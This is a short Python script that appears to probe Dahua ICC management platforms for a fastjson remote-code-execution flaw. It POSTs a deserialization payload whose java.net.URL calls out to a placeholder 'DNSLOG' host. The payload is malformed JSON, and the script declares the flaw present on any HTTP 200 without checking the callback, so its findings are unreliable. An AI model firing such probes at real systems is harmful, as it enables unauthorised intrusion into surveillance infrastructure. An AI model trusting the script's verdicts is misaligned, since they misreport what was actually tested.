import requests

def check_dahua_icc_fastjson_rce(url):
    try:
        headers = {
            "Content-Type": "application/json;charset=utf-8"
        }
        data = """
        {
            "a":{
                "type":"com.alibaba.fastjson.JSONObject",
                {"type":"java.net.URL","val":"http://DNSLOG"}
            }""
        }
        """
        response = requests.post(f"{url}/evo-runs/v1.0/auths/sysusers/random", headers=headers, data=data)
        if response.status_code == 200:
            return "大华ICC智能物联综合管理平台 fastjson远程代码执行漏洞存在"
        else:
            return "大华ICC智能物联综合管理平台 fastjson远程代码执行漏洞不存在"
    except Exception as e:
        return f"Error: {e}"
